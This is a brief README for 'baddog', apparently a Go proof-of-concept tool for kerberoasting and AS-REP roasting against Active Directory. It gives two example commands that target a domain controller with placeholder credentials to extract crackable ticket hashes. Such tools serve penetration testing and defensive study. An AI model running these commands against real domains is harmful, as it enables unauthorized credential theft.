# baddog

Simple kerberoast/asreproast POC in Go. Code obviously needs work :)

## Example usage

```
baddog asreproast -u dummyuser -p 'password1!' -d DOMAIN.LOCAL --dc-ip 192.168.1.11 --enc rc4              
baddog kerberoast -u dummyuser -p 'password1!' -d DOMAIN.LOCAL --dc-ip 192.168.1.11 --enc rc4
```

Many many thanks to ropnop, whose "kerbrute" tool really helped me understand how to use the gokrb5 library!
